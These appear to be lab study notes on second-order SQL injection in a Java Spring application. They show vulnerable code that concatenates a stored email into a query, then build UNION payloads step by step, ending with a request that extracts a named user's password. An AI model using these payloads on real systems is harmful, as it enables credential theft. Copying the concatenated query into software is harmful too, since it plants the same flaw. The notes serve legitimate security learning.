# Second-Order SQLi

`Second-order SQL injection` is a type of `SQL injection` where `user-input` is `stored` by the application and then later used in a `SQL` query unsafely.

## **Example**

```java
// ProfileController.java

@GetMapping({"/profile/{id}"})
public String profile(@PathVariable int id, Model model, HttpServletResponse response) throws IOException {
    String sql;
    User user;
    try {
        sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
        user = (User)this.jdbcTemplate.queryForObject(sql, new Object[]{id}, new BeanPropertyRowMapper(User.class));
    } catch (Exception var8) {
        response.sendRedirect("/");
        return null;
    }

    sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
    List posts = this.jdbcTemplate.queryForList(sql);
    model.addAttribute("user", user);
    model.addAttribute("posts", posts);
    UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    model.addAttribute("userDetails", userDetails);
    return "profile";
}

```

1. The first selects the `username`, `name`, `description`, `email` and `id` values from `users` where `id` matches `{id}` in the path. These values are then used to initialize a `User` object.
2. The second query selects `posts` made by the `user` whose `email` matches the `email` of the `User` object we just created.

If we can find a way to set the value of `email` for a known `id`, then we should be able to exploit a `second-order SQL injection`. So let's do a little bit of `input tracing`, and find out where/if we can set the value of `email`. To update a value in SQL, you have to use the `UPDATE` keyword, so we can grep for this in the project.

```java
grep -irnE 'UPDATE.*email'
com/bmdyy/bluebird/controller/ProfileController.java:70:               sql = "UPDATE users SET name = ?, description = ?, email = ?";
com/bmdyy/bluebird/controller/ProfileController.java:85:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, passwordHash, userDetails.getId()});
com/bmdyy/bluebird/controller/ProfileController.java:87:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
```

```java
@PostMapping({"/profile/edit"})
public void editProfilePOST(@RequestParam String name, @RequestParam String description, @RequestParam String email, @RequestParam(required = false) String password, @RequestParam(required = false) String repeatPassword, HttpServletResponse response) throws IOException {
<SNIP>
    sql = "UPDATE users SET name = ?, description = ?, email = ?";
<SNIP>
    sql = sql + " WHERE id = ?";
<SNIP>
    this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
<SNIP>
}
```

## **Exploiting Second-Order SQL Injection**

![image.png](Second-Order%20SQLi/image.png)

```java
SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC
```

So we can change the email to:

```java
' UNION SELECT 1,2,3,4,5--
```

Unfortunately, this exact payload will result in a `SQL error`, but we can easily troubleshoot it. Taking another look at the error message in the log file we can see that `type character varying and integer cannot be matched`:

![image.png](Second-Order%20SQLi/image%201.png)

![image.png](Second-Order%20SQLi/image%202.png)

What this means is that some of the columns are supposed to be `VARCHAR` and we tried to union with 5 `INTEGER` values. There are multiple ways we can figure out which ones are supposed to be which, the easiest way being to look at the full query listed in the error message and deduce the types. The columns `text, posted_at_nice, username and name` are all likely to be `VARCHAR` whereas `author_id` is probably an `INTEGER`.

```java
' UNION SELECT '1','2','3','4',5--
```

![image.png](Second-Order%20SQLi/image%203.png)

```java
email='+UNION+SELECT+password,'2','3','4',5+from+users+where+username='betrayedApples3'--&password=&repeatPassword=
```